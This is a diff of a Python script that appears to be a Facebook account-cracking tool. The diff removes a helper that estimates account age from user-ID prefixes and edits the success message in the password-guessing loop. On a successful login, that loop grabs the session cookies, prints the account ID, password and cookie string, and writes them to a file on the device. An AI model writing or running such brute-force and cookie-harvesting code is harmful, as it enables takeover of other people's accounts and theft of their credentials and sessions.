@@ -120,38 +120,6 @@ for txxxtt in range (1000):
 	h='Mobile Safari/537.36'
 	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
 	ugen.append(ffg)
-	
-#__________EHC CYBER 99 EMRAN
-def samiya(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :Emran = ' (*-*) 2009'
-        elif uid[:9] in ['100000000']       :Emran = '√ 2009'
-        elif uid[:8] in ['10000000']        :Emran = '√ 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:Emran = '√ 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:Emran = ' 2010'
-        elif uid[:6] in ['100001']          :Emran = '√ 2010/2011'
-        elif uid[:6] in ['100002','100003'] :Emran = '√ 2011/2012'
-        elif uid[:6] in ['100004']          :Emran = '√ 2012/2013'
-        elif uid[:6] in ['100005','100006'] :Emran = '√ 2013/2014'
-        elif uid[:6] in ['100007','100008'] :Emran = '√ 2014/2015'
-        elif uid[:6] in ['100009']          :Emran = '√ 2015'
-        elif uid[:5] in ['10001']           :Emran = '√ 2015/2016'
-        elif uid[:5] in ['10002']           :Emran = '√ 2016/2017'
-        elif uid[:5] in ['10003']           :Emran = '√ 2018/2019'
-        elif uid[:5] in ['10004']           :Emran = '√ 2019/2020'
-        elif uid[:5] in ['10005']           :Emran = '√ 2020'
-        elif uid[:5] in ['10006','10007','']:Emran = '√ 2021'
-        elif uid[:5] in ['10008']           :Emran = '√ 2022'
-        elif uid[:5] in ['10009']           :Emran = '√ 2023'
-        else:Emran=''
-    elif len(uid) in [9,10]:
-        Emran = ' √ 2008/2009'
-    elif len(uid)==8:
-        Emran = '√ 2007/2008'
-    elif len(uid)==7:
-        Emran = '√ 2006/2007'
-    else:Emran=''
-    return Emran
 #--------------------------(LOGO BOX)--------------------------#
 logo =("""                                                
 \x1b[38;5;46m                                   ,...             
@@ -275,7 +243,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\r\r\033[1;32m[ARAFAT-OK💚] ' +cid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
+                print('\r\r\033[1;32m[ARAFAT-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                 open('/sdcard/ARAFAT-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
